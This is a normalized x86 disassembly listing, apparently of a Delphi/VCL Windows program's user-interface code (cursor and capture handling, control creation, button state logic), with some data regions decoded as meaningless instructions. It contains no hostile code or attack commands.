lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
call sub_42f358
lea ecx [ ebp - 0x28 ]
mov dl [ ebp - 0x9 ]
call sub_42f69c
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_41db3c
push eax
call sub_42f358
lea ecx [ ebp - 0x28 ]
pop edx
call sub_42f544
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41db3c
push eax
call sub_42f358
lea ecx [ ebp - 0x28 ]
pop edx
call sub_42f4a8
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
mov bl 0x2
dec al
je r-xdata
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ esi + 0x70 ]
call sub_41d3f4
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_41d798
lea ecx [ ebp - 0x8 ]
xor edx edx
xor eax eax
call sub_412910
test bl bl
je r-xdata
cmp [ ebp - 0x9 ] 0x4
jne r-xdata
mov bl 0x3
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x40 ]
mov eax esi
call sub_43a34c
mov eax [ ebp - 0x40 ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_43c620
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_42d164
mov edx 0xff000014
mov eax 0xff00000f
call sub_423ea8
mov edx eax
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_41d3c8
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_41d798
cmp [ esi + 0x181 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d7dd
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403e78
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax 0x1
call sub_412910
jmp r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41cc28
mov bl 0x4
jmp r-xdata
dec al
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x3c ]
mov eax esi
call sub_43a34c
mov eax [ ebp - 0x3c ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_43c620
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_42d164
jmp r-xdata
mov bl 0x5
jmp r-xdata
sub_42d7e4
push ebx
push esi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_438bf8
cmp esi eax
sete bl
xor bl 0x1
mov [ esi + 0x181 ] bl
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax esi
call sub_43b4f4
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax esi
call sub_43b4f4
jmp r-xdata
sub_42d848
push ebx
mov ebx eax
mov eax ebx
call sub_43c3fc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov edx eax
mov eax [ ebx + 0x16c ]
call sub_42c61c
pop ebx
retn
sub_42d874
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_43b908
test bl bl
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
jne r-xdata
mov [ esi + 0x171 ] 0x1
mov [ esi + 0x182 ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42d8cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43bbc0
cmp [ ebx + 0x171 ] 0x0
je r-xdata
cmp [ ebx + 0x181 ] 0x0
jne r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax ebx
call sub_42d7e4
mov [ ebp - 0x2 ] 0x3
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
mov al [ ebp - 0x2 ]
cmp al [ ebx + 0x182 ]
je r-xdata
mov eax ebx
call sub_439d50
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
mov al [ ebp - 0x2 ]
mov [ ebx + 0x182 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
test edi edi
jl r-xdata
mov eax ebx
call sub_439d94
cmp edi eax
jg r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebp - 0x2 ] 0x2
mov [ ebp - 0x2 ] 0x3
jmp r-xdata
sub_42d96c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
push esi
push edi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43bc68
cmp [ ebx + 0x171 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov [ ebx + 0x171 ] 0x0
test esi esi
jl r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_439d50
cmp esi eax
jge r-xdata
mov [ ebp - 0x3 ] al
cmp [ ebx + 0x168 ] 0x0
jne r-xdata
test edi edi
jl r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov [ ebx + 0x182 ] 0x0
mov [ ebx + 0x181 ] 0x0
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov eax ebx
call sub_439d94
cmp edi eax
jle r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov dl [ ebx + 0x170 ]
xor dl 0x1
mov eax ebx
call sub_42db24
cmp [ ebx + 0x170 ] 0x0
je r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov al [ ebx + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov [ ebx + 0x182 ] 0x3
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
mov eax ebx
call sub_42d7e4
mov eax ebx
mov si 0xffeb
call sub_403300
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
sub_42dab8
push esi
mov esi eax
test dl dl
jae r-xdata
cmp dl 0x4
jbe r-xdata
mov dl 0x1
jmp r-xdata
mov eax [ esi + 0x16c ]
cmp dl [ eax + 0x20 ]
je r-xdata
mov dl 0x4
pop esi
retn
call sub_42c5f4
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42daec
add esp 0xfffffff0
mov edx [ eax + 0x168 ]
test edx edx
je r-xdata
add esp 0x10
retn
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov [ esp ] 0xb018
mov [ esp + 0x4 ] edx
mov [ esp + 0x8 ] eax
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov eax [ eax + 0x30 ]
call sub_43d878
sub_42db24
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x168 ] 0x0
jne r-xdata
cmp bl [ esi + 0x170 ]
je r-xdata
xor ebx ebx
pop esi
pop ebx
retn
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov [ esi + 0x170 ] bl
test bl bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov [ esi + 0x182 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
cmp [ esi + 0x182 ] 0x0
jne r-xdata
mov eax esi
call sub_42daec
mov [ esi + 0x182 ] 0x3
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
test bl bl
je r-xdata
sub_42dc1c
push esi
mov esi eax
cmp dl [ esi + 0x178 ]
je r-xdata
pop esi
retn
mov [ esi + 0x178 ] dl
test dl dl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42dc8c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
and eax 0x7f
mov dl [ eax + rw-data ]
mov eax [ ebx + 0x16c ]
call sub_42c61c
mov eax ebx
call sub_42d7e4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop ebx
retn
sub_42dcc0
push ebx
push esi
mov ebx eax
mov eax [ edx + 0x4 ]
cmp eax [ ebx + 0x168 ]
jne r-xdata
pop esi
pop ebx
retn
mov esi [ edx + 0x8 ]
cmp ebx esi
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov al [ esi + 0x172 ]
mov [ ebx + 0x172 ] al
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebx + 0x170 ] 0x0
mov [ ebx + 0x182 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_446b18
sub_42dd30
push ebp
mov ebp esp
push 0x0
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_42ddb9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43a34c
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_451470
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov eax [ esi + 0x30 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax esi
mov si 0xffeb
call sub_403300
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ddc0
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_42ddfc
push ebx
push esi
mov esi eax
mov eax esi
call sub_43c06c
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
call sub_42f358
call sub_42f438
test al al
je r-xdata
cmp [ esi + 0x5d ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x181 ] 0x1
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call GetCapture
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_42de70
push ebx
push esi
mov esi eax
mov eax esi
call sub_43c084
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov [ esi + 0x181 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call sub_42f358
call sub_42f438
test al al
je r-xdata
cmp [ esi + 0x171 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_42ded8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42da88
mov ebx eax
mov edx [ esi + 0x34 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ esi + 0x30 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax ebx
call sub_422284
mov eax [ eax + 0x14 ]
mov edx 0xff00ff
call sub_41d3f4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412938
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_422284
pop edx
call sub_41d798
push 0x0
push edi
push 0x1
mov eax ebx
call sub_422284
mov edx eax
xor ecx ecx
mov eax esi
call sub_447e9c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42df68
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43c214
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
test bl bl
jne r-xdata
mov edx [ esi + 0x6c ]
mov eax [ ebp - 0x4 ]
call sub_42dbb0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42da88
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax [ esi + 0x5c ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ esi + 0x80 ] 0x0
jl r-xdata
mov ebx esi
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_447984
cmp eax [ ebx + 0x80 ]
jle r-xdata
push ebp
mov eax esi
mov edx [ eax + 0x80 ]
mov eax [ eax + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_42ded8
pop ecx
sub_42e024
or al [ eax ]
add [ eax ] al
test al 0x69
inc esi
add [ esi + esi * 2 + 0x46 ] bl
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 2 + 0x74d00046 ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x64004669 ] ah
je r-xdata
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 2 + 0x75800046 ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x67ffb997 ] bl
jbe r-xdata
lea eax [ eax ]
sub [ rw-data ] 0x1
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 2 + 0x74900046 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42e0cc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 2 + 0x79540046 ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x1bffb997 ] dl
jbe r-xdata
retn
mov eax sub_42e024
call sub_403c28
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402b18
xor eax eax
pop edx
pop ecx
pop ecx
call sub_42e008
mov [ fs : eax ] edx
push sub_42e0d3
retn
push [ ebx ]
rcr [ edx + 0x59 ] 0x59
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 2 + 0x77940046 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c004669 ] cl
sub_42e1b1
add [ edi - 0x167fffbe ] al
inc edx
add [ edx ] dl
push esp
dec edi
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
jecxz r-xdata
outsb
push eax
imul esp [ ebx + 0x74 ] 0x44657275
imul esp [ ecx + 0x6c ] 0x408d676f
add ah dl
loope r-xdata
inc ebx
inc ecx
add ah bh
retn
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
jecxz r-xdata
add [ esi ] al
inc esi
add [ edi ] al
adc dl [ edi + ecx * 2 + 0x70 ]
outsb
push eax
imul esp [ ebx + 0x74 ] 0x44657275
imul esp [ ecx + 0x6c ] 0xe14c676f
inc edx
add [ eax + 0x72 ] bl
inc edx
add [ ebx ] dl
add [ edi ] al
inc ebp
js r-xdata

add [ eax - 0x1d ] al
inc edx
add [ eax ] ch
add al [ eax ]
add [ esp + ecx * 4 + 0x42 ] dl
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ eax - 0x63ffbc1a ] ah
xor [ eax ] al
mov eax 0x98004030
daa
xor [ eax ] al
cwde
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1d ] bl
inc edx
inc esp
add [ eax + 0x16 ] al
inc esp
add [ eax - 0x22 ] ch
inc ebx
add [ eax ] ch
inc esp
insb
jae r-xdata
xchg esp eax
adc [ eax ] al
pushad
add [ eax ] al
jmp [ eax ]
imul ebp [ esp + esi * 2 + 0x65 ] r-xdata
insb
loop r-xdata
add [ eax + edx + 0x600040 ] dl
add bh bh
pushad
add [ eax ] al
call [ ebp + ebp * 8 + 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46060008 ] al
sub_42e408
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_42e6bd
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_427870
lea edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_423a68
mov edx [ ebp - 0x8 ]
lea eax [ esi + 0x60 ]
call sub_403ea8
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a60c
mov ebx eax
mov [ esi + 0xb8 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_43a37c
push 0xa9
push 0xc8
mov ecx 0x5
mov edx 0xcc
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
xor edx edx
mov eax ebx
call sub_42aa5c
mov edx 0x6
mov eax ebx
call sub_42aa94
mov dx 0x1
mov eax ebx
call sub_440d44
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_432d10
mov ebx eax
mov [ esi + 0xbc ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_43a37c
push 0x9d
push 0x17
mov ecx 0x6
mov edx 0x6
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
mov dl 0x1
mov eax ebx
call sub_439860
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d2b4
mov ebx eax
mov [ esi + 0xc0 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push 0x17
push 0x16
mov ecx 0x1
mov edx 0x4d
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax ebx
call sub_42da88
mov ecx r-xdata
mov edx [ rw-data ]
call sub_4226a4
lea edx [ ebx + 0x80 ]
mov eax [ rw-data ]
call sub_4059b8
xor edx edx
mov eax ebx
call sub_43a4c0
mov dl 0x1
mov eax ebx
call sub_43a49c
mov [ ebx + 0x124 ] esi
mov eax [ esi ]
mov eax [ eax + 0x44 ]
mov [ ebx + 0x120 ] eax
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a60c
mov ebx eax
mov [ esi + 0xc4 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_43a37c
push 0x9d
push 0x91
mov ecx 0x1d
mov edx 0x6
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
mov dl 0x5
mov eax ebx
call sub_439860
mov dl 0x2
mov eax ebx
call sub_42aa40
mov dl 0x1
mov eax ebx
call sub_42aa5c
xor edx edx
mov eax ebx
call sub_440d44
mov ecx esi
mov dl 0x1
mov eax [ sub_428440 ]
call sub_429e64
mov [ esi + 0xc8 ] eax
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ebx [ esi + 0xc8 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x5
mov eax ebx
call sub_439860
mov [ ebx + 0x12c ] esi
mov eax [ esi ]
mov eax [ eax + 0x44 ]
mov [ ebx + 0x128 ] eax
mov edx [ esi + 0xc4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov dl 0x1
mov eax ebx
call sub_42a290
mov dl 0x1
mov eax ebx
call sub_42a260
mov dl 0x1
mov eax ebx
call sub_42a238
mov [ ebx + 0x17a ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e6c4
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
add esp 0xfffffff0
call sub_403428
sub_42e6c4
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_42e8c5
xor ebx ebx
call sub_40390c
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_427a70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e963
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403e78
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403e78
retn
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_4059b8
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xbc ]
call sub_43a37c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc0 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
xor edx edx
call sub_42a250
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_4059b8
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc4 ]
call sub_43a37c
sub_42e980
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
xor edx edx
mov [ ebp - 0x34 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42ea58
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebx + 0x3c ]
push eax
call GetClientRect
lea edx [ ebp - 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
sub edx eax
add edx eax
mov [ ebp - 0x10 ] edx
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0xb8 ]
call sub_439d0c
lea edx [ ebp - 0x30 ]
mov eax [ ebx + 0xc4 ]
call sub_439cec
mov edx [ ebp - 0x28 ]
mov eax [ ebx + 0xc0 ]
sub edx [ eax + 0x48 ]
sub edx 0x2
mov eax [ ebx + 0xc0 ]
call sub_439abc
xor edx edx
mov eax [ ebx + 0xc8 ]
call sub_42a250
lea eax [ ebx + 0xcc ]
call sub_403e54
lea edx [ ebp - 0x34 ]
mov eax [ rw-data ]
call sub_4059b8
mov edx [ ebp - 0x34 ]
mov eax [ ebx + 0xc4 ]
call sub_43a37c
mov edx [ ebx + 0x3c ]
mov eax [ ebx + 0xb8 ]
call sub_43e25c
mov eax ebx
call sub_4277d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ea5f
lea eax [ ebp - 0x34 ]
call sub_403e54
retn
sub_42ea98
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi eax
xor eax eax
push ebp
push sub_42ecff
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45293c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42ece2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_453780
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43a37c
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_454100
mov eax [ ebp - 0x4 ]
mov [ eax + 0x22d ] 0x1
mov dl 0x4
mov eax [ ebp - 0x4 ]
call sub_454760
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1e4 ] edi
mov [ eax + 0x1e0 ] r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a60c
mov ebx eax
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_43a37c
mov dl 0x5
mov eax ebx
call sub_439860
xor edx edx
mov eax ebx
call sub_42aa5c
mov dl 0x1
mov eax ebx
call sub_42aab0
mov edx 0x5
mov eax ebx
call sub_42aa94
mov edx 0xff000005
mov eax ebx
call sub_43a4ec
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov [ ebx + 0x1f8 ] 0x1
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ sub_428440 ]
call sub_429e64
mov esi eax
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x5
mov eax esi
call sub_439860
mov dl 0x1
mov eax esi
call sub_42a260
mov dl 0x1
mov eax esi
call sub_42a290
mov dl 0x1
mov eax esi
call sub_42a238
mov eax [ edi + 0xc8 ]
mov edx [ eax + 0x168 ]
mov eax [ esi + 0x168 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_420188
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xec ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ece9
mov eax [ ebp - 0x4 ]
call sub_403104
retn
mov eax [ ebp - 0x4 ]
call sub_439d50
mov esi eax
mov eax ebx
call sub_439d50
sub esi eax
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_420188
add esi eax
add esi 0xa
push esi
mov eax [ ebp - 0x4 ]
call sub_4542d0
call sub_457a4c
lea eax [ eax + eax * 2 ]
test eax eax
jns r-xdata
sar eax 0x2
pop edx
call sub_4240b0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_453720
mov eax [ ebp - 0x4 ]
call sub_439d94
mov esi eax
mov eax ebx
call sub_439d94
sub esi eax
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_4201a0
add esi eax
add esi 0xa
push esi
mov eax [ ebp - 0x4 ]
call sub_4542d0
